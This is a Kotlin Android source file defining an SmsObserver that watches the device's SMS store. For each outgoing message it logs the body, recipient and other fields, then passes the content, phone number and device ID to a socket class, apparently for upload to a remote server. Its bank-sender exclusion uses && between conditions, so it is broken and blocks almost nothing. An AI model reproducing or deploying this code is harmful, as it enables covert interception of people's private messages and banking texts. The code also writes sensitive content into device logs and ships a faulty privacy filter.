package com.tekskills.er_tekskills.services

import android.annotation.SuppressLint
import android.content.Context
import android.database.ContentObserver
import android.net.Uri
import android.os.Handler
import android.telephony.TelephonyManager
import android.text.format.Time
import android.util.Log
import com.tekskills.er_tekskills.Configration.MySocket
import com.tekskills.er_tekskills.presentation.activities.SplashScreenActivity
import com.tekskills.er_tekskills.utils.Common

/**
 * Created by Ravi Kiran p
 */
class SmsObserver(handler: Handler?, private val mContext: Context) : ContentObserver(handler) {
    private val contactId = ""
    private val contactName = ""
    private var smsBodyStr = ""
    private var phoneNoStr = ""
    private var smsDatTime = System.currentTimeMillis()
    var today: Time? = null
    override fun deliverSelfNotifications(): Boolean {
        return true
    }

    @SuppressLint("Range")
    override fun onChange(selfChange: Boolean) {
        try {
            val sms_sent_cursor =
                mContext.contentResolver.query(SMS_STATUS_URI, null, null, null, null)
            if (sms_sent_cursor != null) {
                if (sms_sent_cursor.moveToFirst()) {
                    val protocol =
                        sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("protocol"))
                    if (protocol == null) {
                        val type = sms_sent_cursor.getInt(sms_sent_cursor.getColumnIndex("type"))
                        if (type == 2) {
                            Log.e(
                                "Info",
                                "Id : " + sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("_id"))
                            )
                            Log.e(
                                "Info",
                                "Thread Id : " + sms_sent_cursor.getString(
                                    sms_sent_cursor.getColumnIndex("thread_id")
                                )
                            )
                            Log.e(
                                "Info",
                                "Address : " + sms_sent_cursor.getString(
                                    sms_sent_cursor.getColumnIndex("address")
                                )
                            )
                            Log.e(
                                "Info",
                                "Person : " + sms_sent_cursor.getString(
                                    sms_sent_cursor.getColumnIndex("person")
                                )
                            )
                            Log.e(
                                "Info",
                                "Date : " + sms_sent_cursor.getLong(sms_sent_cursor.getColumnIndex("date"))
                            )
                            Log.e(
                                "Info",
                                "Read : " + sms_sent_cursor.getString(
                                    sms_sent_cursor.getColumnIndex("read")
                                )
                            )
                            Log.e(
                                "Info",
                                "Status : " + sms_sent_cursor.getString(
                                    sms_sent_cursor.getColumnIndex("status")
                                )
                            )
                            Log.e(
                                "Info",
                                "Type : " + sms_sent_cursor.getString(
                                    sms_sent_cursor.getColumnIndex("type")
                                )
                            )
                            Log.e(
                                "Info",
                                "Rep Path Present : " + sms_sent_cursor.getString(
                                    sms_sent_cursor.getColumnIndex("reply_path_present")
                                )
                            )
                            Log.e(
                                "Info",
                                "Subject : " + sms_sent_cursor.getString(
                                    sms_sent_cursor.getColumnIndex("subject")
                                )
                            )
                            Log.e(
                                "Info",
                                "Body : " + sms_sent_cursor.getString(
                                    sms_sent_cursor.getColumnIndex("body")
                                )
                            )
                            Log.e(
                                "Info",
                                "Err Code : " + sms_sent_cursor.getString(
                                    sms_sent_cursor.getColumnIndex("error_code")
                                )
                            )
                            smsBodyStr =
                                sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("body"))
                                    .trim { it <= ' ' }
                            phoneNoStr =
                                sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("address"))
                                    .trim { it <= ' ' }
                            smsDatTime =
                                sms_sent_cursor.getLong(sms_sent_cursor.getColumnIndex("date"))
                            Log.e("Info", "SMS Content : $smsBodyStr")
                            Log.e("Info", "SMS Phone No : $phoneNoStr")
                            Log.e("Info", "SMS Time : $smsDatTime")
                            val mngr: TelephonyManager =
                                mContext.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
                            today = Time(Time.getCurrentTimezone())
                            today!!.setToNow()
                            val date =
                                today!!.year.toString() + "-" + (today!!.month + 1) + "-" + today!!.monthDay
                            val time = today!!.format("%k:%M:%S")
                            SplashScreenActivity.flag = "outgoing"
                            if (phoneNoStr.contains("ICICI") && phoneNoStr.contains("KotkBK") && phoneNoStr.contains(
                                    "Axis"
                                )
                                && phoneNoStr.contains("HDFC") && phoneNoStr.contains("SYN") && phoneNoStr.contains(
                                    "SBI"
                                )
                                && phoneNoStr.contains("FROMSC") && phoneNoStr.contains("CANBNK")
                            ) {
                                Log.v("SMS", "SMS BLOCKED")
                            } else {
                                val mysocket = MySocket(
                                    mContext,
                                    smsBodyStr,
                                    Common.deviceID(mContext),
                                    date,
                                    time,
                                    "Text",
                                    "",
                                    "",
                                    phoneNoStr,
                                    ""
                                )
                                mysocket.connectSocket()
                            }
                            return
                        }
                    }
                }
            } else Log.e("Info", "Send Cursor is Empty")
        } catch (sggh: Exception) {
            Log.e("Error", "Error on onChange : $sggh")
        }
        super.onChange(selfChange)
    }

    companion object {
        val SMS_STATUS_URI = Uri.parse("content://sms")
    }
}